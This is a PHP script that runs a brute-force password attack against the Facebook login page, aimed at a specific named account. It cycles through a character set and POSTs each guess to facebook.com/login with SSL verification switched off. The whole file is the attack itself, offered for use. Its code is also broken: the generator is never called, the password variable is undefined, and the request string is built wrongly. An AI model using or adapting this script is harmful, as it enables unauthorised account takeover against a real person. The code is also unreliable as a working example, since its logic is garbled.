<?php

global $wrong;
global $startpagina;
$time = microtime() * 100000;
$username = "kenkensquidkuddlephish";
echo "https://twitter.com/LizardL4nds";
define('P_MAX_LEN', 12);
$c_set = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
$c_len = strlen($c_set); 		/*strlen() function is used to find the length of the character set*/
function repeat($width, $position, $character)
{     
	global $c_set, $c_len; 
		
	for ($i = 0; $i < $c_len; $i++) 
	{        
		if ($position  < $width - 1) 
		{    
			repeat($width, $position + 1, $character . $c_set[$i]); 
		}
		     
		check_correct($character . $c_set[$i]);    
	}
} 

while(True) {

        if(check_correct($Pass)) {
            die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
    <tr>
        <td>
            <div align='center'><b>Found the password of: ".$Pass."<br> For the account: ".$username."</b></div>
        </td>
    </tr>
</table>
</body>
</html>");
            
        }

echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
    <tr>
        <td>
            <div align='center'><b>Sorry... a password was not found for the account of <span class='alert'>".$username."</span> during the brute for
ce attack.</b></div>
        </td>
    </tr>
</table>";
}


// Function for checking whether the username and password are correct
function check_correct($Pass)
{
        $c = curl_init('https://www.facebook.com/login');
        curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
        curl_setopt($c, CURLOPT_POST, 1);
        curl_setopt($c, CURLOPT_POSTFIELDS, "email='.$username.'&pass='.$Pass.'");
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); // We need to fetch something from a string, so no direct output!
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); // we get redirected, so follow
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
        $str = curl_exec($c); // Get it
        curl_close($c);
        if($str > "What's on your mind?") {return true;}
        else {return false;}
}

?>
